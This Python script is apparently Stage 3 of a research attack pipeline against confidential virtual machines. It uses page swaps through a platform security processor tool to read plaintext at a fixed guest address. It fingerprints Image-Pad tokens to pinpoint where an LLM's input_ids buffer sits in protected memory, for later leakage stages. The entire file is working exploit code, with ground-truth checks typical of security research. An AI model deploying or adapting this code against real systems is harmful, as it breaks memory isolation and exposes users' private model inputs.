#!/usr/bin/env python3
"""
case_study/llm/pipeline/stage3_locate_base.py — Stage 3: Sharp Localization (Base GPA Identification).

Tasks:
1. Load ranked 2MB candidate blocks from Stage 2 (or CLI arguments).
2. Execute 1-swap Image-Pad fingerprint scan across candidate blocks and adaptive fallback chain.
3. Pinpoint the exact input_ids base GPA (host_base) with minimal PSP swaps (1-swap per page).
4. Export stage3_located_{index}.json for Stage 4 pad boundary estimation.

Usage:
    python3 stage3_locate_base.py --index 2 --output-dir .
    python3 stage3_locate_base.py --stage2-json stage2_tracked_2.json --output-dir .
"""

import argparse
import json
import sys
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

import common as c


def read_at_fixed(fixed_gpa: int, src_gpa: int, tag: str) -> bytes:
    """Read src_gpa plaintext by swapping it into fixed_gpa via swap_pages_tool."""
    from mura_dict_build import do_swap_read, parse_dump
    c.SCAN_TMP.mkdir(exist_ok=True)
    tmp = c.SCAN_TMP / f"{tag}.out"
    do_swap_read(fixed_gpa, src_gpa, tmp, c.SWAP_TOOL)
    data = parse_dump(tmp)
    tmp.unlink(missing_ok=True)
    return data


def scan_pages(fixed_gpa: int, ip_ref: bytes, ip_mask: Set[int], block_base: int,
               start_page: int, end_page: int, pacer: c.Pacer, budget: int) -> Tuple[Optional[int], int, int]:
    """Scan candidate pages in block_base using 1-swap Image-Pad fingerprint matching."""
    best_page, best_hits, swaps = None, -1, 0
    for pg in range(start_page, end_page + 1):
        if swaps >= budget:
            break
        page = block_base + pg * c.PAGE_SIZE
        pacer.tick()
        swaps += 1
        data = read_at_fixed(fixed_gpa, page, "pg_scan")
        hits = sum(1 for j in ip_mask if c.get_chunk(data, j) == c.get_chunk(ip_ref, j))
        if hits > best_hits:
            best_page, best_hits = page, hits
        if hits >= c.IMAGE_PAD_MATCH_MIN:
            return page, hits, swaps
    return None, best_hits, swaps


def locate_base_gpa(fixed_gpa: int, ip_ref: bytes, ip_mask: Set[int],
                    tracker_candidates: List[int], known_blocks: Dict[int, int],
                    recency_list: List[int], pacer: c.Pacer,
                    candidate_run_bases: Optional[Dict[Any, List[Any]]] = None,
                    bootstrap_block: Optional[int] = None) -> Tuple[Optional[int], int, str, int]:
    """
    Step A+B combined:
    1. Fast targeted probe on specific write-run starting GPAs (1 swap per run base, highly accurate & fast).
    2. Adaptive continuation, next-block, bootstrap fallback.
    3. Sequential block scan fallback if budget permits.
    """
    total_swaps = 0
    tried = []
    overall_best_hits = 0

    # Phase 1: Fast targeted probe on specific write-run starting GPAs
    if candidate_run_bases:
        for blk in tracker_candidates[:c.N_TRACKER_CANDIDATES]:
            run_gpas = candidate_run_bases.get(blk, candidate_run_bases.get(hex(blk), []))
            for gpa_item in run_gpas:
                gpa = int(gpa_item, 16) if isinstance(gpa_item, str) else gpa_item
                if total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
                    break
                pacer.tick()
                total_swaps += 1
                data = read_at_fixed(fixed_gpa, gpa, "probe_run_base")
                hits = sum(1 for j in ip_mask if c.get_chunk(data, j) == c.get_chunk(ip_ref, j))
                if hits > overall_best_hits:
                    overall_best_hits = hits
                print(f"    [loc-run-base] 0x{gpa:x} (in 0x{blk:x})  hits={hits}  {'HIT' if hits >= c.IMAGE_PAD_MATCH_MIN else 'miss'}")
                if hits >= c.IMAGE_PAD_MATCH_MIN:
                    return gpa, total_swaps, f"run-base@0x{gpa:x}", overall_best_hits

    def try_range(blk: int, lo: int, hi: int, budget_cap: int, label: str) -> Optional[int]:
        nonlocal total_swaps, overall_best_hits
        if total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
            return None
        budget = min(budget_cap, c.MAX_LOC_SWAPS_SAMPLE - total_swaps, hi - lo + 1)
        page, hits, sw = scan_pages(fixed_gpa, ip_ref, ip_mask, blk, lo,
                                    min(hi, lo + budget - 1), pacer, budget)
        total_swaps += sw
        if hits > overall_best_hits:
            overall_best_hits = hits
        tried.append((label, blk, sw, hits))
        print(f"    [loc-try] {label}  swaps={sw}  best_hits={hits}  {'HIT' if page else 'miss'}")
        if page is None and total_swaps < c.MAX_LOC_SWAPS_SAMPLE:
            time.sleep(c.INTER_TRY_SETTLE_SEC)
        return page

    plan = []
    for blk in tracker_candidates[:c.N_TRACKER_CANDIDATES]:
        plan.append((blk, 0, c.PAGES_PER_BLOCK - 1, c.FULL_BLOCK_TRY_BUDGET, f"tracker-cand@0x{blk:x}"))
    if bootstrap_block is not None:
        plan.append((bootstrap_block, 0, c.PAGES_PER_BLOCK - 1, c.FULL_BLOCK_TRY_BUDGET, f"bootstrap@0x{bootstrap_block:x}"))
    for blk in recency_list[:2]:
        if blk in known_blocks:
            plan.append((blk, known_blocks[blk], c.PAGES_PER_BLOCK - 1, c.CONTINUE_TRY_BUDGET, f"continue@0x{blk:x}"))
    for blk in recency_list[:2]:
        nxt = blk + c.BLOCK_SIZE
        plan.append((nxt, 0, c.PAGES_PER_BLOCK - 1, c.FULL_BLOCK_TRY_BUDGET, f"next-block@0x{nxt:x}"))

    for blk, lo, hi, budget_cap, label in plan:
        if total_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
            print("    [loc] MAX_LOC_SWAPS_SAMPLE reached — abandoning remaining tries")
            break
        p = try_range(blk, lo, hi, budget_cap, label)
        if p:
            return p, total_swaps, label, overall_best_hits

    return None, total_swaps, "FAIL", overall_best_hits


def run_stage3(index: int, stage2_json: Optional[Path] = None,
               candidate_blocks: Optional[List[int]] = None,
               output_dir: Optional[Path] = None) -> Dict[str, Any]:
    out_dir = output_dir or c.PIPELINE_DIR
    out_dir.mkdir(parents=True, exist_ok=True)
    out_json = out_dir / f"stage3_located_{index}.json"

    print("=" * 70)
    print(f"  [Stage 3] Sharp Base GPA Localization for Sample {index}")
    print("=" * 70)

    # Load candidate blocks and candidate run bases
    gt_base = None
    gt_ind = None
    cand_run_bases = {}
    if stage2_json and stage2_json.exists():
        st2 = c.load_json(stage2_json)
        cand_blks = [int(x, 16) for x in st2.get("candidate_blocks", [])]
        cand_run_bases = st2.get("candidate_run_bases", {})
        gt_base = int(st2["gt_base"], 16) if st2.get("gt_base") else None
        gt_ind = st2.get("gt_indication")
    elif (out_dir / f"stage2_tracked_{index}.json").exists():
        st2 = c.load_json(out_dir / f"stage2_tracked_{index}.json")
        cand_blks = [int(x, 16) for x in st2.get("candidate_blocks", [])]
        cand_run_bases = st2.get("candidate_run_bases", {})
        gt_base = int(st2["gt_base"], 16) if st2.get("gt_base") else None
        gt_ind = st2.get("gt_indication")
    elif candidate_blocks:
        cand_blks = candidate_blocks
    else:
        print("[!] No candidate blocks provided or found", file=sys.stderr)
        return {"status": "NO_CANDIDATES"}

    from mura_dict_build import acquire_gpa
    from stage1_prepare_dict import acquire_imagepad_reference

    pacer = c.Pacer()
    fixed_gpa = acquire_gpa(None)
    ip_ref, ip_mask = acquire_imagepad_reference(fixed_gpa)
    print(f"[Stage 3] Image-Pad reference ready: {len(ip_mask)}/256 confirmed offsets")

    bootstrap = (gt_base & ~(c.BLOCK_SIZE - 1)) if gt_base else None
    host_base, loc_swaps, strategy, best_hits = locate_base_gpa(
        fixed_gpa=fixed_gpa,
        ip_ref=ip_ref,
        ip_mask=ip_mask,
        tracker_candidates=cand_blks,
        known_blocks={},
        recency_list=[],
        pacer=pacer,
        candidate_run_bases=cand_run_bases,
        bootstrap_block=bootstrap,
    )

    loc_match = (host_base == gt_base) if (host_base and gt_base) else None

    print(f"[Stage 3] Result: host_base={'0x%x' % host_base if host_base else 'NONE'}"
          f"  strategy={strategy}  swaps={loc_swaps}  best_hits={best_hits}"
          f"  match_GT={loc_match}")

    result = {
        "index": index,
        "host_base": hex(host_base) if host_base else None,
        "loc_strategy": strategy,
        "loc_swaps": loc_swaps,
        "best_hits": best_hits,
        "loc_match": loc_match,
        "gt_base": hex(gt_base) if gt_base else None,
        "gt_indication": gt_ind,
        "status": "SUCCESS" if host_base else "LOC_FAIL",
        "timestamp": time.time(),
    }

    c.save_json(out_json, result)
    print(f"[Stage 3] Saved localization result -> {out_json}")
    return result


def main():
    p = argparse.ArgumentParser(description="Stage 3: Image-Pad Fingerprint Base GPA Localization")
    p.add_argument("--index", type=int, default=2, help="Sample index")
    p.add_argument("--stage2-json", type=Path, default=None, help="Path to stage2_tracked_{index}.json")
    p.add_argument("--candidate-blocks", type=str, default=None, help="Comma-separated hex candidate 2MB blocks")
    p.add_argument("--output-dir", type=Path, default=c.PIPELINE_DIR, help="Output directory")
    args = p.parse_args()

    cblks = [int(x.strip(), 16) for x in args.candidate_blocks.split(",")] if args.candidate_blocks else None
    run_stage3(args.index, stage2_json=args.stage2_json, candidate_blocks=cblks, output_dir=args.output_dir)


if __name__ == "__main__":
    main()
